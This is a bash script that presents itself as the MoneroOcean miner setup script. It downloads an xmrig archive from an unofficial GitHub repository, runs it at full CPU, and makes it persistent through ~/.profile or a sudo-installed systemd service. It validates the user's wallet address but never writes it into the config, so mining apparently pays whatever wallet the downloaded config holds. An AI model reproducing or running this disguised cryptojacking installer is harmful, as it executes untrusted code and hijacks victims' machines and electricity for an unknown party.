#!/bin/bash

VERSION=2.11

echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not advised to run this script under root"
fi

# Command line arguments
WALLET=$1
EMAIL=$2 # optional

if [ -z "$WALLET" ]; then
  echo "Script usage:"
  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=$(echo "$WALLET" | cut -f1 -d".")
if [ ${#WALLET_BASE} -ne 106 ] && [ ${#WALLET_BASE} -ne 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z "$HOME" ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d "$HOME" ]; then
  echo "ERROR: HOME directory $HOME does not exist"
  exit 1
fi

if ! type curl >/dev/null 2>&1; then
  echo "ERROR: This script requires 'curl' utility"
  exit 1
fi

if ! type tar >/dev/null 2>&1; then
  echo "ERROR: This script requires 'tar' utility"
  exit 1
fi

# Calculate port
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000 ))

power2() {
  if ! type bc >/dev/null 2>&1; then
    local n=$1
    for val in 8192 4096 2048 1024 512 256 128 64 32 16 8 4 2 1; do
      if [ "$n" -ge "$val" ]; then
        echo "$val"
        return
      fi
    done
  else
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
  fi
}

PORT=$(( EXP_MONERO_HASHRATE * 30 ))
PORT=$(( PORT == 0 ? 1 : PORT ))
PORT=$(power2 $PORT)
PORT=$(( 10000 + PORT ))

if [ "$PORT" -lt 10001 ] || [ "$PORT" -gt 18192 ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi

# Universal extraction function
extract_tar() {
  local ARCHIVE="$1"
  local DEST="$2"

  if [ ! -f "$ARCHIVE" ]; then
    echo "ERROR: File $ARCHIVE does not exist"
    return 1
  fi

  mkdir -p "$DEST"

  case "$ARCHIVE" in
    *.tar.gz|*.tgz)
      tar -xzf "$ARCHIVE" -C "$DEST" ;;
    *.tar.bz2|*.tbz2)
      tar -xjf "$ARCHIVE" -C "$DEST" ;;
    *.tar.xz|*.txz)
      tar -xJf "$ARCHIVE" -C "$DEST" ;;
    *.tar)
      tar -xf "$ARCHIVE" -C "$DEST" ;;
    *)
      echo "ERROR: Unknown archive format: $ARCHIVE"
      return 1 ;;
  esac
}

# Preparing miner
echo "[*] Removing previous moneroocean miner (if any)"
sudo systemctl stop moneroocean_miner.service 2>/dev/null || true
killall -9 xmrig 2>/dev/null || true
rm -rf "$HOME/moneroocean"

# Download
echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://github.com/oxx9807/test/raw/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download xmrig.tar.gz"
  exit 1
fi

# Extract
echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
if ! extract_tar /tmp/xmrig.tar.gz "$HOME/moneroocean"; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz"
  exit 1
fi
rm /tmp/xmrig.tar.gz

# Configure miner
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' "$HOME/moneroocean/config.json"
$HOME/moneroocean/xmrig --help >/dev/null 2>&1 || echo "WARNING: Miner binary may not work"

PASS=$(hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g')
[ "$PASS" == "localhost" ] && PASS=$(ip route get 1 | awk '{print $NF;exit}')
[ -z "$PASS" ] && PASS="na"
[ ! -z "$EMAIL" ] && PASS="$PASS:$EMAIL"

sed -i 's/"user": *"[^"]*",/"user": "'$PASS'",/' "$HOME/moneroocean/config.json"
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' "$HOME/moneroocean/config.json"
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' "$HOME/moneroocean/config.json"
sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' "$HOME/moneroocean/config.json"
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' "$HOME/moneroocean/config.json"

# Background config
cp "$HOME/moneroocean/config.json" "$HOME/moneroocean/config_background.json"
sed -i 's/"background": *false,/"background": true,/' "$HOME/moneroocean/config_background.json"

# Miner start script
cat >"$HOME/moneroocean/miner.sh" <<'EOL'
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice "$HOME/moneroocean/xmrig" "$@"
else
  echo "Monero miner is already running."
fi
EOL
chmod +x "$HOME/moneroocean/miner.sh"

# Background execution
if ! sudo -n true 2>/dev/null; then
  if ! grep moneroocean/miner.sh "$HOME/.profile" >/dev/null; then
    echo "$HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1" >>"$HOME/.profile"
  fi
  /bin/bash "$HOME/moneroocean/miner.sh" --config="$HOME/moneroocean/config_background.json" >/dev/null 2>&1
else
  if type systemctl >/dev/null 2>&1; then
    cat >/tmp/moneroocean_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/moneroocean/xmrig --config=$HOME/moneroocean/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/moneroocean_miner.service /etc/systemd/system/moneroocean_miner.service
    sudo systemctl daemon-reload
    sudo systemctl enable moneroocean_miner.service
    sudo systemctl start moneroocean_miner.service
  else
    /bin/bash "$HOME/moneroocean/miner.sh" --config="$HOME/moneroocean/config_background.json" >/dev/null 2>&1
    echo "ERROR: systemctl not found. Miner started manually in background."
  fi
fi

echo "[*] Setup complete"
